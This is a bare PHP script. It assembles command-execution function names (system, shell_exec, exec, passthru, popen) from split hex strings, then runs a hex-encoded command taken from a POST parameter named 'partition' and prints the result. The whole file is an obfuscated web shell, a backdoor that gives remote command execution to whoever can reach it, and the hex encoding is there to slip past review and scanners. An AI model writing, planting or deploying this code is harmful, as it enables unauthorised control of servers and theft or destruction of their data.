<?php

$argument1 = '737';
$argument2 = '865';
$argument3 = 'c5f';
$argument4 = 'f70';
$argument5 = '656';
$argument6 = '16d';
$argument7 = '765';
$argument8 = 'f63';
$argument9 = '6f6';
$argument10 = 'e74';
$argument11 = '36c';
$argument12 = '365';
$argument13 = '706';
$argument14 = '172';
$argument15 = '696';
$uconvert1 = pack("H*", $argument1.'973'.'746'.'56d');
$uconvert2 = pack("H*", '736'.$argument2.'6c6'.$argument3.'657'.$argument2);
$uconvert3 = pack("H*", '657'.'865');
$uconvert4 = pack("H*", '706'.'173'.$argument1.'468'.'727');
$uconvert5 = pack("H*", '706'.$argument4.'656');
$uconvert6 = pack("H*", '737'.'472'.$argument5.$argument6.'5f6'.$argument7.'745'.$argument8.$argument9.$argument10.'656'.'e74');
$uconvert7 = pack("H*", '706'.$argument11.'6f7'.$argument12);
$partition = pack("H*", $argument13.$argument14.'746'.'974'.$argument15.'f6e');
if (isset($_POST[$partition])) {
    $partition = pack("H*", $_POST[$partition]);
    if (function_exists($uconvert1)) {
        $uconvert1($partition);
    } elseif (function_exists($uconvert2)) {
        print $uconvert2($partition);
    } elseif (function_exists($uconvert3)) {
        $uconvert3($partition, $var_identifier);
        print join("\n", $var_identifier);
    } elseif (function_exists($uconvert4)) {
        $uconvert4($partition);
    } elseif (function_exists($uconvert5) && function_exists($uconvert6) && function_exists($uconvert7)) {
        $fld_param = $uconvert5($partition, 'r');
        if ($fld_param) {
            $id_state = $uconvert6($fld_param);
            $uconvert7($fld_param);
            print $id_state;
        }
    }
    exit;
}
